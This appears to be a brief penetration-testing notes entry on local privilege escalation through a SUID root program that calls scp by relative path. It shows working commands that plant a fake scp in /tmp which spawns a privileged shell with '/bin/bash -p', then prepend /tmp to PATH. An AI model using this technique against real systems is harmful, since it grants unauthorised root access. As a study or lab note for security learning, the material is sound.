# Relative Path in SUID Program

```
-rwsr-xr-x  1 root root  10K 1970-01-01 00:01 testprogram
$ cat testprogram

scp -r file/some/* ...
```

Using relative path for program! It should be as /usr/bin/scp. We can manipulate it by adding working dir to the path variable.

```
$ cd /tmp

$ echo "#\!/bin/sh" > scp
$ echo "/bin/bash -p" > scp

$ export PATH=/tmp:$PATH

$ testprogram
```
